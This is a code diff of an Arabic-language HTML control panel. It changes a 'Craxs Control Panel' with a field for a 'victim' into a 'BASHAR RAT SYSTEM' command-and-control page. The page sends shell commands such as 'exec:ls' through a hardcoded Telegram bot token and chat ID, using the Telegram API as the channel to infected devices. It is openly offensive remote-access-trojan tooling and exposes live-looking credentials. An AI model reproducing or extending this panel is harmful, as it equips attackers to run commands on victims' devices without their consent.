@@ -2,65 +2,34 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Craxs Control Panel</title>
+    <title>BASHAR C2 PANEL</title>
     <style>
-        :root { --main-red: #ff0000; --bg-black: #0a0a0a; --card-bg: #161616; }
-        body { background-color: var(--bg-black); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
-        .header { border-bottom: 2px solid var(--main-red); padding-bottom: 10px; margin-bottom: 30px; text-align: center; }
-        .logo { color: var(--main-red); font-size: 24px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
-        .card { background: var(--card-bg); border: 1px solid #333; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(255,0,0,0.1); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: var(--main-red); color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #cc0000; box-shadow: 0 0 10px var(--main-red); }
-        .status { font-size: 12px; color: #888; margin-top: 10px; text-align: center; }
+        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
+        .box { border: 1px solid #ff0000; padding: 20px; border-radius: 5px; box-shadow: 0 0 15px #ff0000; }
+        input { width: 100%; padding: 10px; background: #111; border: 1px solid #333; color: #0f0; margin: 10px 0; }
+        button { width: 100%; padding: 15px; background: #ff0000; color: #fff; border: none; cursor: pointer; font-weight: bold; }
+        .log { margin-top: 20px; font-size: 12px; color: #888; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <div class="logo">BASHAR SYSTEM v1.0</div>
-    </div>
-
-    <div class="card">
-        <h3>📡 إعدادات الاتصال</h3>
-        <input type="text" id="target" placeholder="اسم المستخدم أو الضحية">
-        <input type="text" id="link" placeholder="رابط المنشور أو الهوست">
-        <input type="number" id="amount" placeholder="الكمية / المنفذ">
-        <button onclick="startAction()">إرسال الأمر للسيرفر</button>
-        <div class="status" id="statusText">النظام جاهز للاستقبال...</div>
-    </div>
-
-    <div class="card" style="border-color: #444;">
-        <h4>📊 الإحصائيات</h4>
-        <p>الأجهزة المتصلة: <span style="color: var(--main-red);">0</span></p>
-        <p>العمليات المنفذة: <span style="color: var(--main-red);">0</span></p>
+    <div class="box">
+        <h2>💀 BASHAR RAT SYSTEM</h2>
+        <label>أدخل الأمر البرمجي (مثلاً: exec:ls أو exec:pwd):</label>
+        <input type="text" id="command" placeholder="exec:ls">
+        <button onclick="sendCommand()">إرسال الأمر للصيد الثمين ⚡</button>
+        <div class="log" id="log">في انتظار تنفيذ الأمر...</div>
     </div>
 
     <script>
-        function startAction() {
-            const user = document.getElementById('target').value;
-            const link = document.getElementById('link').value;
-            const amount = document.getElementById('amount').value;
-            const status = document.getElementById('statusText');
-
-            if(!user || !link) { alert("يرجى ملء البيانات!"); return; }
-
-            status.innerText = "جاري الاتصال بالسيرفر...";
-            status.style.color = "#ffaa00";
-
-            // التوكن والآيدي الخاص بك
-            const token = '8772722170:AAFwBy3-oqh4QKCt69Qh9ZouxsfiCHYvsFI';
-            const chatId = '7472169623';
-            const text = `⚠️ أمر جديد من اللوحة:\n👤 المستخدم: ${user}\n🔗 الرابط: ${link}\n🔢 الكمية: ${amount}`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
-            .then(res => {
-                status.innerText = "✅ تم إرسال الأمر بنجاح!";
-                status.style.color = "#00ff00";
-            }).catch(err => {
-                status.innerText = "❌ فشل الاتصال بالسيرفر!";
-                status.style.color = "#ff0000";
+        function sendCommand() {
+            const cmd = document.getElementById('command').value;
+            const token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+            const chat_id = "7214473798";
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(cmd)}`)
+            .then(() => {
+                document.getElementById('log').innerHTML += `<br>> [SENT]: ${cmd}`;
+                alert("تم إرسال الأمر بنجاح!");
             });
         }
     </script>
